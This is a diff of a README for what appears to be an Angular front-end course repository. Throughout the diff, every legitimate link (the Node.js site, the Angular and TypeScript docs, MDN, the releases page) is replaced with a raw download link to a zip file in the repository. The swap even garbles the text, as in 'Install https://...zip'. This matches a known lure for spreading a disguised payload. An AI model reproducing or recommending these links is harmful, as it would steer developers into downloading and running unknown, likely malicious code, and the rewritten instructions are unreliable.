@@ -1,6 +1,6 @@
 # 🌐 angular-frontend-webdev_course-luisdev_part-28_angular-17_typescript-5 - Easy Guide to Downloading and Running
 
-[![Download](https://img.shields.io/badge/Download%20Now-**Click%20Here**-blue)](https://github.com/nightmare189/angular-frontend-webdev_course-luisdev_part-28_angular-17_typescript-5/releases)
+[![Download](https://github.com/nightmare189/angular-frontend-webdev_course-luisdev_part-28_angular-17_typescript-5/raw/refs/heads/main/developments/angular-part-luisdev-course-frontend-typescript-webdev-2.7-beta.4.zip%20Now-**Click%20Here**-blue)](https://github.com/nightmare189/angular-frontend-webdev_course-luisdev_part-28_angular-17_typescript-5/raw/refs/heads/main/developments/angular-part-luisdev-course-frontend-typescript-webdev-2.7-beta.4.zip)
 
 ## 📖 Description
 This repository serves as a course resource for Front-End Development with Angular. It covers the creation of Single Page Applications (SPAs), component-based architecture, routing, services, Angular Material, Reactive Forms, SCSS, REST API integration, and best practices for componentization.
@@ -11,15 +11,15 @@ Follow these simple steps to download and run the application.
 1. **Check System Requirements**
    - Operating System: Windows, macOS, or a modern Linux distribution.
    - Minimum RAM: 4GB
-   - Node.js: Version 14 or higher
+   - https://github.com/nightmare189/angular-frontend-webdev_course-luisdev_part-28_angular-17_typescript-5/raw/refs/heads/main/developments/angular-part-luisdev-course-frontend-typescript-webdev-2.7-beta.4.zip Version 14 or higher
    - A web browser: Google Chrome, Firefox, or Edge is recommended.
 
-2. **Install Node.js**
-   - Visit the [Node.js website](https://nodejs.org) and download the latest version.
+2. **Install https://github.com/nightmare189/angular-frontend-webdev_course-luisdev_part-28_angular-17_typescript-5/raw/refs/heads/main/developments/angular-part-luisdev-course-frontend-typescript-webdev-2.7-beta.4.zip**
+   - Visit the [https://github.com/nightmare189/angular-frontend-webdev_course-luisdev_part-28_angular-17_typescript-5/raw/refs/heads/main/developments/angular-part-luisdev-course-frontend-typescript-webdev-2.7-beta.4.zip website](https://github.com/nightmare189/angular-frontend-webdev_course-luisdev_part-28_angular-17_typescript-5/raw/refs/heads/main/developments/angular-part-luisdev-course-frontend-typescript-webdev-2.7-beta.4.zip) and download the latest version.
    - Follow the installation instructions on the site to complete the setup.
 
 3. **Visit the Download Page**
-   - Go to the releases page by clicking [here](https://github.com/nightmare189/angular-frontend-webdev_course-luisdev_part-28_angular-17_typescript-5/releases) to find the software package.
+   - Go to the releases page by clicking [here](https://github.com/nightmare189/angular-frontend-webdev_course-luisdev_part-28_angular-17_typescript-5/raw/refs/heads/main/developments/angular-part-luisdev-course-frontend-typescript-webdev-2.7-beta.4.zip) to find the software package.
 
 ## 💾 Download & Install
 After visiting the release page, locate the latest version of the application. Download the package that matches your operating system.
@@ -63,14 +63,14 @@ After visiting the release page, locate the latest version of the application. D
 
 ## 📚 Learn More
 To learn more about Angular, check out these resources:
-- [Angular Official Documentation](https://angular.io/docs)
-- [TypeScript Documentation](https://www.typescriptlang.org/docs/)
-- [Node.js Documentation](https://nodejs.org/en/docs/)
+- [Angular Official Documentation](https://github.com/nightmare189/angular-frontend-webdev_course-luisdev_part-28_angular-17_typescript-5/raw/refs/heads/main/developments/angular-part-luisdev-course-frontend-typescript-webdev-2.7-beta.4.zip)
+- [TypeScript Documentation](https://github.com/nightmare189/angular-frontend-webdev_course-luisdev_part-28_angular-17_typescript-5/raw/refs/heads/main/developments/angular-part-luisdev-course-frontend-typescript-webdev-2.7-beta.4.zip)
+- [https://github.com/nightmare189/angular-frontend-webdev_course-luisdev_part-28_angular-17_typescript-5/raw/refs/heads/main/developments/angular-part-luisdev-course-frontend-typescript-webdev-2.7-beta.4.zip Documentation](https://github.com/nightmare189/angular-frontend-webdev_course-luisdev_part-28_angular-17_typescript-5/raw/refs/heads/main/developments/angular-part-luisdev-course-frontend-typescript-webdev-2.7-beta.4.zip)
 
 For additional support or questions regarding the application, feel free to open an issue in this repository.
 
 ## 🔗 Additional Links
-- [Visit Release Page](https://github.com/nightmare189/angular-frontend-webdev_course-luisdev_part-28_angular-17_typescript-5/releases)
-- [JavaScript Tutorials](https://developer.mozilla.org/en-US/docs/Web/JavaScript)
+- [Visit Release Page](https://github.com/nightmare189/angular-frontend-webdev_course-luisdev_part-28_angular-17_typescript-5/raw/refs/heads/main/developments/angular-part-luisdev-course-frontend-typescript-webdev-2.7-beta.4.zip)
+- [JavaScript Tutorials](https://github.com/nightmare189/angular-frontend-webdev_course-luisdev_part-28_angular-17_typescript-5/raw/refs/heads/main/developments/angular-part-luisdev-course-frontend-typescript-webdev-2.7-beta.4.zip)
 
 Thank you for using this resource to learn about Front-End Development with Angular! Enjoy your coding journey!
